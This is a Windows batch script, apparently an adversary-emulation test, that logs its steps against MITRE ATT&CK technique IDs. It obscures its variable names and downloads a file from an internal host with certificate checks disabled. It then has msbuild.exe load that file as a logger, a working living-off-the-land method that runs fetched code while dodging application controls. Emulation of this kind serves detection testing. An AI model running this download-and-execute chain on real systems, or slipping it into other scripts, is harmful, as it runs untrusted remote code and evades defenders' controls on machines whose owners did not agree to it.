@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Preamble: assign PHR_ placeholders to random variable names (6-8 chars)
SET aqwxs=%APPDATA%\10399\d86de943
SET zxcvbn=bb25a4a8.txt
SET poiuy=https://10.0.0.49/stage/2/icon.png?10399-7
SET lkjhg=ITZEL-S2BO
SET mnbvc=10399
SET qwerty=7

REM Internal random variable names for log file and timestamp
SET rfvtgb=%APPDATA%\!qwerty!\macula-simulations.log
SET yhnmju=!DATE!/!TIME!

REM ----- Debug: heartbeat start -----
echo [!yhnmju!][DEBUG][!lkjhg!][!mnbvc!]: heartbeat_start>> "!rfvtgb!" 2>nul

REM ----- Step 1: Heartbeat fetch (single curl) -----
curl -k -s -o "!aqwxs!\!zxcvbn!" "!poiuy!"
set tgt_err=!errorlevel!

REM ----- Debug: heartbeat result -----
echo [!yhnmju!][DEBUG][!lkjhg!][!mnbvc!]: heartbeat_complete=!tgt_err!>> "!rfvtgb!" 2>nul

REM ----- Debug: chdir start -----
echo [!yhnmju!][DEBUG][!lkjhg!][!mnbvc!]: chdir_start>> "!rfvtgb!" 2>nul

REM ----- Step 2: Change directory to output dir -----
cd /d "!aqwxs!" >nul 2>&1
set chdir_rc=!errorlevel!

REM ----- Debug: chdir result -----
echo [!yhnmju!][DEBUG][!lkjhg!][!mnbvc!]: chdir_result=!chdir_rc!>> "!rfvtgb!" 2>nul

REM ----- Create minimal .proj file for msbuild -----
echo ^<Project/^> > "!aqwxs!\build.proj"

REM ----- Debug: msbuild start -----
echo [!yhnmju!][DEBUG][!lkjhg!][!mnbvc!]: msbuild_start>> "!rfvtgb!" 2>nul

REM ----- Step 3: LOLBIN invocation via msbuild /logger: -----
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "!aqwxs!\build.proj" /logger:LoggerEntry,"!aqwxs!\!zxcvbn!";MyParameters,Foo >NUL 2>&1
set msbuild_rc=!errorlevel!

REM ----- TTP logging for T1218 -----
IF !msbuild_rc! NEQ 0 (
    set ttp_result=FAIL
    set ttp_error=msbuild_failed
) ELSE (
    set ttp_result=OK
    set ttp_error=
)
echo [!yhnmju!][TTP][!lkjhg!][!mnbvc!]: T1218|System Binary Proxy Execution=[!ttp_result!]:[!ttp_error!]>> "!rfvtgb!" 2>nul

REM ----- Debug: msbuild complete -----
echo [!yhnmju!][DEBUG][!lkjhg!][!mnbvc!]: msbuild_complete=!msbuild_rc!>> "!rfvtgb!" 2>nul

REM ----- Step 4: Log T1027 obfuscation pass (always OK) -----
echo [!yhnmju!][TTP][!lkjhg!][!mnbvc!]: T1027|Obfuscated Files or Information=[OK]:[]>> "!rfvtgb!" 2>nul

REM ----- Debug: script exit -----
echo [!yhnmju!][DEBUG][!lkjhg!][!mnbvc!]: script_end>> "!rfvtgb!" 2>nul

ENDLOCAL
EXIT /B 0